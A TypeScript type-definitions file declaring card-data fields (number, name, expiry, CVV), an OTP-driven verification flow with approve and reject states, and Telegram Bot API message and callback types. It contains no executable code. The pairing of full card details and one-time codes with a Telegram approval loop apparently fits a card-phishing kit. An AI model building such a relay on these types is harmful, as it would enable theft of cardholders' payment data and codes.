/**
 * Type definitions for credit card related types
 */
export type CreditCardType =
  | "Visa"
  | "MasterCard"
  | "AmericanExpress"
  | "DinersClub"
  | "Unknown";

/**
 * Type declarations for unique card types
 */
declare const Visa: unique symbol;
declare const MasterCard: unique symbol;
declare const AmericanExpress: unique symbol;
declare const DinersClub: unique symbol;
declare const UnknownCard: unique symbol;

export type CardTypeSymbols = {
  readonly Visa: typeof Visa;
  readonly MasterCard: typeof MasterCard;
  readonly AmericanExpress: typeof AmericanExpress;
  readonly DinersClub: typeof DinersClub;
  readonly Unknown: typeof UnknownCard;
};

/**
 * Card data structure
 */
export interface CardData {
  cardNumber: string;
  cardholderName: string;
  expiryDate: string;
  cvv: string;
}

/**
 * Application state status
 */
export type ApplicationStatus =
  | "idle"
  | "verifying"
  | "approved"
  | "rejected"
  | "completed";

/**
 * App state context interface
 */
export interface AppState {
  status: ApplicationStatus;
  cardData: CardData | null;
  requestId: string | null;
  otp: string | null;
  error: string | null;
  setStatus: (status: ApplicationStatus) => void;
  setCardData: (data: CardData | null) => void;
  setRequestId: (id: string | null) => void;
  setOtp: (otp: string | null) => void;
  setError: (error: string | null) => void;
  reset: () => void;
}

/**
 * Telegram API types
 */
export interface TelegramResponse<T> {
  ok: boolean;
  result: T;
  description?: string;
}

export interface TelegramUpdate {
  update_id: number;
  message?: {
    message_id: number;
    from: {
      id: number;
      is_bot: boolean;
      first_name: string;
      username?: string;
    };
    chat: {
      id: number;
      type: string;
      first_name?: string;
      username?: string;
    };
    date: number;
    text?: string;
  };
  callback_query?: {
    id: string;
    from: {
      id: number;
      is_bot: boolean;
      first_name: string;
      username?: string;
    };
    message: {
      message_id: number;
      chat: {
        id: number;
        type: string;
        first_name?: string;
        username?: string;
      };
      date: number;
      text?: string;
    };
    data: string;
  };
}

/**
 * Constants used throughout the application
 */
export const CONSTANTS = {
  OTP: {
    LENGTH: 6,
    RESEND_COOLDOWN_SECONDS: 60,
    MAX_ATTEMPTS: 3,
    AUTO_REDIRECT_DELAY_MS: 2000,
  },
  VERIFICATION: {
    TIMEOUT_SECONDS: 180,
    POLL_INTERVAL_MS: 3000,
    MAX_RETRIES: 5,
  },
};

/**
 * Polling backoff constants
 */
export const POLLING_BACKOFF = {
  INITIAL_DELAY: 1000,
  MAX_DELAY: 10000,
  FACTOR: 1.5,
  MAX_RETRIES: 5,
};
